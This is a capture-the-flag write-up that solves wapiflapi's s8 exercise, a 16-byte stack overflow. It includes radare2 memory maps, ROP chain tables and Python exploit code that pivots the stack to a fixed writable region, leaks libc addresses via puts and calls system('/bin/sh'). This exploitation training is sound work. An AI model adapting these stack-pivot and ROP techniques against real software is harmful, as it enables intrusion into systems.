# Solving wapiflapi's s8 with radare2 and binexpect


## Intro

This is s8:

```c
int	 main(int argc, char **argv)
{
  char buffer[32];

  (void) argc, (void) argv;

  printf("Welcome Stranger\n");
  printf("What is your password?\n");

  if (read(0, buffer, 48) <= 0)
    err(EXIT_FAILURE, "read");

  printf("If you're cool you'll get a shell.\n");

  if (strcmp("pretend_you_dont_know_this", buffer) == 0)
    printf("neo\n");

  return 0;
}
```

It's very similar to s7, but this time there are only 16 bytes of overflow.

### Goal

To spawn a shell

### Challanges

1. **only 16 bytes of overflow** !
1. **no call to `system`**
2. only one read call in a single buffer
3. must be solved using only stdin / stdout
4. no assumptions on libc version or address layout are allowed


### Solution plan

This solution is 90% the same as for [s7](https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7), but the reduced amount of overflow needs a different way of leak memory content and execute the shell at the end.

The general idea is to **move the stack to a known location** in a way which permits 2 things otherwise not possible:

1. use the entire buffer to store ROP chains
2. use absolute addresses, e.g. for storing "/bin/sh" string in the stack itself

By controlling stack location, is also natural to keep `rsp` constant, avoiding running out the stack.

Since all the rest is the same as [s7 solution](https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7), in this writeup are explained only the differences.

## Moving the stack to a known memory area

Let's use radare2 debugger to show candidate memory maps:

```r2
# r2 -d s8
Process with PID 28790 started...
PID = 28790
pid = 28790 tid = 28790
r_debug_select: 28790 28790
Using BADDR 0x400000
Asuming filepath ./s8
bits 64
pid = 28790 tid = 28790
 -- Enable asm.trace to see the tracing information inside the disassembly
[0x7fae09baeaf0]> dm
sys   4K 0x0000000000400000 - 0x0000000000401000 s r-x /media/sf_src/exrs/sploit/s8
sys   8K 0x0000000000600000 - 0x0000000000602000 s rw- /media/sf_src/exrs/sploit/s8
sys 128K 0x00007fae09bae000 * 0x00007fae09bce000 s r-x /lib/x86_64-linux-gnu/ld-2.13.so
sys   8K 0x00007fae09dcd000 - 0x00007fae09dcf000 s rw- /lib/x86_64-linux-gnu/ld-2.13.so
sys   4K 0x00007fae09dcf000 - 0x00007fae09dd0000 s rw- unk0
sys 132K 0x00007fff31568000 - 0x00007fff31589000 s rw- [stack]
sys   8K 0x00007fff315fe000 - 0x00007fff31600000 s r-x [vdso]
sys   4K 0xffffffffff600000 - 0xffffffffff601000 s r-x [vsyscall]
[0x7fae09baeaf0]>
```

The area in the range `0x600000 - 0x602000` is mapped at fixed addresses and has read/write permissions, so it is a perfect candidate for stack use. Any address within that range can be used, but i prefer to place it in the middle of the second half, way after `.got.plt`, say around `0x601800`.


## Repeatable leak, reloaded

Basically, four `read` are called to perform a leak:

1. the first one moves `rbp` to constant address `0x00601800` and triggers the read again there
2. the second one writes the ROP chain at the chosen address and reset the stack to point to the beginning of the ROP chain itself, triggers the leak using `puts`
3. the third one is needed to catch the new line (since we are using the entirety of the `count` bytes)
4. the fourth is to account for repetability

This is the stack layout for the central ROP chain:

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
0x00400703       | 8 bytes       | `pop rdi; ret` gadget
XXXXXXXX         | 8 bytes        | Address to leak
0x004004c0       | 8 bytes        | `puts` in the plt
0x00400520		| 8 bytes			| entry point again (will trigger a new `read`)
0x00601800-0x28		| 8 bytes			| address of the beginning of this ROP chain
0x00400691		| 8 bytes			| `leave; ret;` gadget, this is the **entry point of the chain**, will reset the stack to the beginning of the chain returning into it



Here is the relevant python code:


```python
def leak(address):
    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x00601800, # frame pointer
        0x00400630, # read@main
        )    

    s7.sendbin(payload)
    
    payload = rop(
        0x00400703, # pop rdi; ret;
        address,    # leak
        0x004004c0, # puts@plt
        0x00400520, # entry point again
        0x00601800-0x28, # new RSP 
        0x00400691, # leave; ret;
        )
    

    s7.sendbin(payload)

    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x00601718, # frame pointer (somewhere harmless)
        0x00400630, # read@main
        )    

    s7.sendbinline(payload)

    s7.tryexpect("If you're cool you'll get a shell.\n"
                 "If you're cool you'll get a shell.\n"
                 "(.*)\n"
                 "Welcome Stranger\n"
                 "What is your password\?\n"
                 "If you're cool you'll get a shell.\n"
                 "If you're cool you'll get a shell.\n"
                 "Welcome Stranger\n"
                 "What is your password\?\n",
                  exitwithprogram=False
                 )

    if s7.match != None:
        result = s7.match.group(1)
    else:
        result = ""

    return result
```

## Executing the shell

The approach is similar to the one used in the `leak()` but simpler, because here it is not necessary to account for repeatability.

The ROP chain will contain the "/bin/sh" string itself and a pointer to it (since the addresses are deterministic):

Chunk Contents   | Chunk length   | Meaning 
-----------------| ---------------|----------------
0x00400703       | 8 bytes       | `pop rdi; ret` gadget
0x00601800-8         | 8 bytes        | Address of `"/bin/sh"` below
system       | 8 bytes        | address of `system` 
0x0068732F6E69622F		| 8 bytes			| `"/bin/sh"` string bytes, plus null terminator (here encoded as little endian 64-bits integer)
0x00601800-0x28		| 8 bytes			| address of the beginning of this ROP chain
0x00400691		| 8 bytes			| `leave; ret;` gadget, this is the **entry point of the chain**, will reset the stack to the beginning of the chain returning into it

Here is the python code:

```python
def execute_shell(system_addr):

    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x00601800, # frame pointer
        0x00400630, # read@main
        )    

    s7.sendbin(payload)
    
    payload = rop(
        0x00400703, # pop rdi; ret;
        0x00601800-8,    # "/bin/sh" address
        system_addr, 
        0x0068732F6E69622F, # "/bin/sh" string itself
        0x00601800-0x28, # new RSP 
        0x00400691, # leave; ret;
        )
    

    s7.sendbin(payload)

    payload = bytes('A' * 32, 'utf-8')

    payload += rop(
        0x00601718, # frame pointer
        0x00400630, # read@main
        )    

    s7.sendbinline(payload)

    s7.tryexpect("If you're cool you'll get a shell.\n"
                 "If you're cool you'll get a shell.\n" )


    return;
```

## Running and cinema

To run the exploit are necessary:

* python3
* pexpect
* binexpect

The exploit python file and binexpect.py must be in the same directory of s8 executable.

[![asciicast](https://asciinema.org/a/7lduxgfs32s0zhi0trqopay92.png)](https://asciinema.org/a/7lduxgfs32s0zhi0trqopay92)
